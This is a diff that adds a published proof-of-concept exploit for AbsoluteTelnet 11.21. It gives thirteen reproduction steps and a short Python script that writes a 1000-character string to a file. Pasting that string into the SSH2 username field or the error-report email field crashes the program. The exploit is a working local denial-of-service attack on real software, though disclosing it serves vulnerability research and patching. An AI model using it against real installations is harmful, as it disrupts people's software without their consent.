@@ -1,0 +1,30 @@
+# Exploit Title: AbsoluteTelnet 11.21 - 'Username' Denial of Service (PoC)
+# Discovered by: Xenofon Vassilakopoulos
+# Discovered Date: 2020-05-21
+# Vendor Homepage: https://www.celestialsoftware.net/
+# Software Link : https://www.celestialsoftware.net/telnet/AbsoluteTelnet11.21.exe
+# Tested Version: 11.21
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 7 Professional x86 SP1
+
+# Description: AbsoluteTelnet 11.21 - 'SHA2/Username' and 'Send Error Report' Denial of Service (PoC)
+
+# Steps to reproduce:
+# 1. - Run python script
+# 2. - Open absolutetelnet.txt and copy content to clipboard
+# 3. - Open AbsoluteTelnet 11.21
+# 4. - Select "new connection file -> Connection -> SSH2" 
+# 5. - Paste the contents at the field "Authentication -> Username" 
+# 6. - press "ok" button
+# 7. - Crashed
+# 8. - Reopen AbsoluteTelnet 11.21
+# 9. - A new window will appear that prompts you to send an error report
+# 10.- Open absolutetelnet.txt and copy content to clipboard
+# 11.- Paste the contents at the field "Your Email Address (optional)"
+# 12.- press "Send Error Report" button
+# 13.- Crashed
+
+buf = "\x41" * 1000
+f = open ("absolutetelnet.txt", "w")
+f.write(buf)
+f.close()
